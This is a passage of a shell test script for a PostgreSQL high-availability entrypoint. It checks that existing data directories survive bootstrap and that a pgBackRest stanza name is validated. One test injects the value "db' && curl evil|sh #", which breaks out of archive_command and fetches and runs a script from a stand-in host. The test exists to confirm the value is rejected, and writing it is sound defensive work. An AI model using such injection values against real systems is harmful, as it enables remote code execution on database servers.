  bad "#298: a completed bootstrap was touched" "${_bd2_out}; user-table present=$([ -f "${_bd2}/pgdata/user-table" ] && echo yes || echo no)"
fi

# 3. THE SAFETY CASE: a directory from an older image -- PG_VERSION, no sentinel, and no
# in-progress marker -- must be left alone. Absence of proof that the bootstrap finished is not
# proof that it did not, and this is the one scenario where guessing wrong destroys real data.
_bd3=$(mktemp -d); mkdir -p "${_bd3}/pgdata"
echo 18 > "${_bd3}/pgdata/PG_VERSION"; echo "years of data" > "${_bd3}/pgdata/user-table"
_bd3_out=$(_bd_run "${_bd3}")
if [ "${_bd3_out}" = "initdb=no" ] && [ -f "${_bd3}/pgdata/user-table" ]; then
  ok "#298: a pre-marker data directory is never discarded (no in-progress marker = no evidence)"
else
  bad "#298: a pre-marker data directory was destroyed" "${_bd3_out}; user-table present=$([ -f "${_bd3}/pgdata/user-table" ] && echo yes || echo no)"
fi

# 4. The in-progress marker must be cleared on success, so the NEXT start has no false evidence.
if [ ! -f "${_bd1}/.pg-ha-initdb-in-progress" ] && [ ! -f "${_bd2}/.pg-ha-initdb-in-progress" ]; then
  ok "#298: the in-progress marker is cleared once bootstrap_initdb returns"
else
  bad "#298: a stale in-progress marker survived a successful bootstrap"
fi
rm -rf "${_bd1}" "${_bd2}" "${_bd3}"

# --- #298 security review: PGBACKREST_STANZA is validated before the GUC write ---
# The stanza is interpolated into single-quoted archive_command/restore_command GUCs, so a
# single quote would close the string and hand the rest to the archiver's /bin/sh. bootstrap
# must FAIL closed on a stanza carrying anything outside [A-Za-z0-9_-].
_sz=$(mktemp -d); mkdir -p "${_sz}/bad" "${_sz}/good"
if PGDATA="${_sz}/bad" POSTGRES_USER=app POSTGRES_DB=app POSTGRES_PASSWORD=pw \
   REPMGR_USER=repmgr REPMGR_DB=repmgr REPMGR_PASSWORD=pw \
   PGBACKREST_ENABLED=true PGBACKREST_STANZA="db' && curl evil|sh #" bash -c '
     source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
     initdb() { echo 18 > "$PGDATA/PG_VERSION"; }; pg_ctl() { :; }; psql() { :; }
     bootstrap_initdb' </dev/null >/dev/null 2>&1; then
  bad "#298: a PGBACKREST_STANZA carrying a quote was accepted (archive_command injection)"
else
  ok "#298: a PGBACKREST_STANZA carrying a quote is refused before the GUC write"
fi
# A plain stanza must NOT trip the guard (it may fail later for unrelated reasons; assert only
# that the archive_command it would write carries the clean name).
if PGDATA="${_sz}/good" POSTGRES_USER=app POSTGRES_DB=app POSTGRES_PASSWORD=pw \
   REPMGR_USER=repmgr REPMGR_DB=repmgr REPMGR_PASSWORD=pw \
   PGBACKREST_ENABLED=true PGBACKREST_STANZA="prod-db_1" bash -c '
     source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
     initdb() { echo 18 > "$PGDATA/PG_VERSION"; }; pg_ctl() { :; }; psql() { :; }
     bootstrap_initdb' </dev/null >/dev/null 2>&1
   grep -q "stanza=prod-db_1" "${_sz}/good/postgresql.conf" 2>/dev/null; then
  ok "#298: a valid PGBACKREST_STANZA passes the guard and reaches archive_command"
else
  bad "#298: a valid PGBACKREST_STANZA was rejected or not written to archive_command"
fi
rm -rf "${_sz}"

[ "$fail" -eq 0 ] && echo "ALL TESTS PASSED" || echo "TESTS FAILED"
exit "$fail"
